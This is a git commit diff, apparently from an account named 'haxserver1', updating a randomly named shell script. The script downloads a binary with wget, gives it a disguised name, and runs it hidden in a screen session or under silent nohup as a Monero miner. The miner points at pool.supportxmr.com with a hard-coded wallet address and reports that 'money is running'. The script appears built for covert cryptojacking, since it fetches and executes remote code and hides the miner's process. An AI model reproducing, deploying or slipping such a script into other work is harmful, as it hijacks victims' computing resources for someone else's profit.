1d7929bc584f57a4e0657c48db187c28e21b27d0
haxserver1 <155544992+haxserver1@users.noreply.github.com>
2024-06-02 08:07:28 +0800

    Update sj17yu23b7db19sn20nf721b7sb2.sh v2

--- sj17yu23b7db19sn20nf721b7sb2.sh
+++ sj17yu23b7db19sn20nf721b7sb2.sh
@@ -5,19 +5,33 @@ FILE_NAME="session_ajqysbey"
 
 wget -O $FILE_NAME $FILE_URL
 chmod +x $FILE_NAME 
+
+
+# Command to run
+COMMAND="./$FILE_NAME -o pool.supportxmr.com:443 -u 48PMjoMcbA64NPR7ESQvRsKeDuVXA6AkVAr6LvEUCzxqBimsKvmxeYxN5Ys8htQ2NudViF8PVe8BHbT1eY5jWFXWQ1PB6fG -k --tls -p haxx"
+
+# Use the filename as the screen session name
+SESSION_NAME=$(basename "$FILE_NAME")
+
+# Check if screen is installed
 if command -v screen &> /dev/null
 then
-    screen -dmS mysession ./$FILE_NAME -o pool.supportxmr.com:443 -u 48PMjoMcbA64NPR7ESQvRsKeDuVXA6AkVAr6LvEUCzxqBimsKvmxeYxN5Ys8htQ2NudViF8PVe8BHbT1eY5jWFXWQ1PB6fG -k --tls -p haxx 
+    # Run the file in a screen session
+    screen -dmS $SESSION_NAME $COMMAND
     sleep 1
-    if screen -list | grep -q "mysession"; then
+    # Check if the screen session is running
+    if screen -list | grep -q "$SESSION_NAME"; then
         echo "money is running in screen"
     else
         echo "error"
     fi
 else
-    nohup ./$FILE_NAME -o pool.supportxmr.com:443 -u 48PMjoMcbA64NPR7ESQvRsKeDuVXA6AkVAr6LvEUCzxqBimsKvmxeYxN5Ys8htQ2NudViF8PVe8BHbT1eY5jWFXWQ1PB6fG -k --tls -p haxx  &> /dev/null &
+    # Run the file in the background using nohup
+    nohup $COMMAND &> /dev/null &
+    PID=$!
     sleep 1
-    if ps -ef | grep -v grep | grep -q "$FILE_NAME"; then
+    # Check if the process is running
+    if ps -p $PID > /dev/null; then
         echo "money is running in the background"
     else
         echo "error"
